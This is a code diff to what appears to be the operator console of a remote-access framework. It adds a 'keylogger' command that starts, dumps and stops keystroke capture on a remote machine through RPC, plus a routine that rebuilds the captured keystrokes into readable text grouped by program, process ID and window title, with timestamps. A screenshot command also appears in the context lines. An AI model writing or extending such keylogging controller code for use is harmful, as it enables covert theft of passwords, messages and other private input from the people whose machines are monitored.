@@ -146,7 +146,73 @@ class PayloadSessionCmd(SessionCmd):
     
     def do_keylogger(self, line):
         '''Log the keys pressed on the remote machine.'''
-        pass
+        cmd = line
+        cmds = {
+                'start': self.rpc.keylogger_start,
+                'dump': self._dump_keylog,
+                'stop': self.rpc.keylogger_stop,
+        }
+        try:
+            cmds[cmd]()
+        except KeyError:
+            self.error('Invalid argument: {}'.format(cmd))
+
+    def _dump_keylog(self):
+        dq = self.rpc.keylogger_dump()
+        last_exe = ''
+        space = '\n'
+        for entry in dq:
+            if entry['event'] == 'Keylogger.start':
+                print('Keylogger started - {0:%Y-%m-%d %H:%M:%S}'.format(
+                    entry['time'],
+                ))
+                space = ''
+                continue
+
+            if entry['event'] == 'Keylogger.stop':
+                print(space, end='')
+                print('Keylogger stopped - {0:%Y-%m-%d %H:%M:%S}'.format(
+                    entry['time'],
+                ))
+                last_exe = ''
+                continue
+
+            if entry['exe'] != last_exe:
+                print()
+                print(space, end='')
+                header = '{} ({}) - {}'.format(
+                        entry['exe'],
+                        entry['pid'],
+                        entry['title'],
+                )
+                print(header)
+                print('-'*len(header))
+                last_exe = entry['exe']
+                print_timestamp = True
+
+            if print_timestamp:
+                print('({0:%Y-%m-%d %H:%M:%S}) '.format(entry['time']), end='')
+                print_timestamp = False
+
+            try:
+                key = '<{}>'.format(
+                        entry['key'].split('.')[1].capitalize(),
+                )
+            except IndexError:
+                key = entry['key']
+
+            if 'Enter' in key:
+                key = '\n'
+                print_timestamp = True
+                space = ''
+            elif 'Space' in key:
+                key = ' '
+            elif 'Backspace' in key:
+                key = key.replace('Backspace', 'Back')
+            else:
+                space = '\n\n'
+
+            print(key, end='')
 
     def all_screenshot(self):
         return ['screenshot']
